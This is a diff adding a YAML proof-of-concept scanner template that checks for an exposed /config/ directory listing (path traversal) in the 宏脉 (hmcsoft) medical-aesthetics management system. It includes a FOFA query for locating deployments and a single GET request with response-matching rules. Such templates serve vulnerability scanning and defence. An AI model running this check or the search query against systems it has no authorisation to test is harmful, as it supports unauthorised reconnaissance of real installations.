@@ -1,0 +1,15 @@
+id: poc-yaml-hmcsoft-config-path-traversal
+info:
+  name: 宏脉医美行业管理系统 config 路径遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 宏脉医美行业管理系统
+  fofa: title="宏脉医美行业管理系统"
+requests:
+- method: GET
+  path: /config/
+  expression: status_code == 200 && contains(body,"/config/") && contains(body,"[To
+    Parent Directory]") && contains(body,"hmcsoft.web")
+variables: {}
+transport: http
